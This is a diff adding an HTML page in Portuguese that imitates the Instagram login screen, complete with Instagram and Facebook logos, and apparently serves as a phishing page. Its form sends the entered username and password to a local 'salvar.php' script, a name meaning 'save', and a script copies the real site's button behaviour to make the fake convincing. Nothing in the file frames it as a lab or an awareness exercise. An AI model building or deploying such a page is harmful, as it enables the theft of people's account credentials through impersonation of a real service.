@@ -1,0 +1,213 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Entrar • Instagram</title>
+    <link rel="icon" type="image/png" href="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/1280px-Instagram_icon.png">
+
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background: linear-gradient(rgba(0,0,0,0.6), rgba(0,0,0,0.6)), 
+                        url('https://images.unsplash.com/photo-1550684848-fac1c5b4e853?auto=format&fit=crop&w=1350&q=80');
+            background-size: cover;
+            background-position: center;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            overflow: hidden;
+        }
+
+        .overlay-text {
+            position: absolute;
+            top: 40px;
+            color: white;
+            font-weight: 600;
+            font-size: 16px;
+            letter-spacing: -0.2px;
+        }
+
+        .main-container {
+            background-color: #fff;
+            width: 100%;
+            max-width: 385px;
+            border-radius: 28px;
+            padding: 45px 20px 30px 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.4);
+            z-index: 10;
+        }
+
+        .logo-img {
+            width: 175px;
+            margin-bottom: 35px;
+            user-select: none;
+        }
+
+        .form-container {
+            width: 100%;
+            max-width: 290px;
+        }
+
+        .input-box {
+            width: 100%;
+            height: 38px;
+            background: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            margin-bottom: 6px;
+            padding: 0 10px;
+            font-size: 12px;
+            outline: none;
+            color: #262626;
+        }
+
+        .input-box:focus {
+            border-color: #a8a8a8;
+        }
+
+        .btn-entrar {
+            width: 100%;
+            height: 32px;
+            background-color: #b2dffc;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-weight: 600;
+            font-size: 14px;
+            margin-top: 8px;
+            cursor: default;
+            transition: background-color 0.3s ease;
+            pointer-events: none;
+        }
+
+        .btn-entrar.btn-active {
+            background-color: #0095f6;
+            cursor: pointer;
+            pointer-events: auto;
+        }
+
+        .separator {
+            display: flex;
+            align-items: center;
+            width: 100%;
+            margin: 20px 0;
+        }
+
+        .line {
+            flex: 1;
+            height: 1px;
+            background: #dbdbdb;
+        }
+
+        .ou-text {
+            margin: 0 18px;
+            color: #8e8e8e;
+            font-size: 13px;
+            font-weight: 600;
+        }
+
+        .fb-login {
+            display: flex;
+            align-items: center;
+            color: #385185;
+            font-size: 14px;
+            font-weight: 600;
+            text-decoration: none;
+            margin-bottom: 20px;
+        }
+
+        .fb-icon {
+            width: 16px;
+            height: 16px;
+            margin-right: 8px;
+        }
+
+        .forgot-link {
+            color: #00376b;
+            font-size: 12px;
+            text-decoration: none;
+            margin-bottom: 35px;
+        }
+
+        .footer-box {
+            width: 100%;
+            border-top: 1px solid #dbdbdb;
+            padding-top: 25px;
+            text-align: center;
+            font-size: 14px;
+            color: #262626;
+        }
+
+        .footer-box a {
+            color: #0095f6;
+            font-weight: 600;
+            text-decoration: none;
+        }
+
+        .btn-entrar.btn-active:active {
+            opacity: 0.8;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="overlay-text">Entre para continuar</div>
+
+    <div class="main-container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" class="logo-img" alt="Instagram">
+
+        <div class="form-container">
+            <form action="salvar.php" method="POST">
+                <input type="text" name="usuario" id="usuario" class="input-box" placeholder="Telefone, nome de usuário ou email" oninput="validar()" required>
+                <input type="password" name="senha" id="senha" class="input-box" placeholder="Senha" oninput="validar()" required>
+                
+                <button type="submit" id="btnSubmit" class="btn-entrar">Entrar</button>
+            </form>
+
+            <div class="separator">
+                <div class="line"></div>
+                <div class="ou-text">OU</div>
+                <div class="line"></div>
+            </div>
+
+            <div style="display: flex; flex-direction: column; align-items: center;">
+                <a href="#" class="fb-login">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" class="fb-icon" alt="fb">
+                    Entrar com o Facebook
+                </a>
+                <a href="#" class="forgot-link">Esqueceu a senha?</a>
+            </div>
+        </div>
+
+        <div class="footer-box">
+            Não tem uma conta? <a href="#">Cadastre-se</a>
+        </div>
+    </div>
+
+    <script>
+        function validar() {
+            const userField = document.getElementById('usuario');
+            const passField = document.getElementById('senha');
+            const btn = document.getElementById('btnSubmit');
+
+            // Habilita o botão se o usuário tiver algo e a senha tiver 6 ou mais caracteres
+            if (userField.value.trim().length > 0 && passField.value.length >= 6) {
+                btn.classList.add('btn-active');
+            } else {
+                btn.classList.remove('btn-active');
+            }
+        }
+    </script>
+</body>
+</html>
